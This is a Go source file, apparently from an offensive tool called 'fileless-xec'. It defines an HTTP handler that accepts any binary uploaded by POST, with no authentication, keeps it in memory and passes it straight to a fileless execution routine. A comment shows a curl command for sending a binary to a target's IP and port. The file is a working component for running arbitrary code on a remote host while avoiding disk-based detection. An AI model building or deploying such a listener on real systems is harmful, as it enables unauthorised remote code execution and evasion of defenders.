package server

import (
	"bytes"
	"fileless-xec/pkg/config"
	"fileless-xec/pkg/exec"
	"fmt"
	"io"
	"net/http"
)

//Upload binary file <= 32Mb and return byte content
//Note: upload with curl -X POST -F "executable=@[BINARY_FILENAME]" http://[TARGET_IP:PORT]/upload
func uploadFile(w http.ResponseWriter, r *http.Request) (content string) {
	// Maximum upload of 10 MB files
	r.ParseMultipartForm(32 << 20)

	// Get handler for filename, size and headers
	file, handler, err := r.FormFile("executable")
	if err != nil {
		fmt.Println("Error Retrieving the File")
		fmt.Println(err)
		return
	}

	defer file.Close()
	//fmt.Printf("Uploaded File: %+v\n", handler.Filename)

	buf := bytes.NewBuffer(nil)
	if _, err := io.Copy(buf, file); err != nil {
		panic(err)
	}

	return buf.String()
}

//Handler for uploading binary files
func UploadAndExecHandler(cfg *config.Config) http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		switch r.Method {
		case "GET":
			http.Error(w, "GET Bad request - Only POST accepted!", 400)
		case "POST":
			cfg.BinaryContent = uploadFile(w, r)
			exec.Filelessxec(cfg)
		}
	}
}
